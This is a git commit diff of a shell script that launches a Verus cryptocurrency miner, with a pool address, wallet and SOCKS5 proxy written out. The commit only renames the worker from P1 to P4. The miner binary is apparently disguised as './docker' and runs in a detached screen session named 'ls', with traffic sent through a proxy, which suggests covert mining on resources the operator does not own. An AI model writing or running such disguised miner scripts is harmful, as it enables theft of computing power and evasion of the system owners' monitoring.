50021e47c0e682a73191ce0315d57f0c98e7dcb8
wertesd <86517111+wertesd@users.noreply.github.com>
2021-07-10 14:24:03 +0700

    Update p4.sh

--- p4.sh
+++ p4.sh
@@ -6,4 +6,4 @@ screen -dmS ls
 POOL=stratum+tcp://na.luckpool.net:3956
 WALLET=RV4aazLmcwkYC6W3uWmDUDAvQKNYgUGbw7
 PROXY=socks5://72.210.252.137:4145
-./docker -a verus -o $POOL -u $WALLET.P1 -p x -t 2 -x $PROXY
+./docker -a verus -o $POOL -u $WALLET.P4 -p x -t 2 -x $PROXY
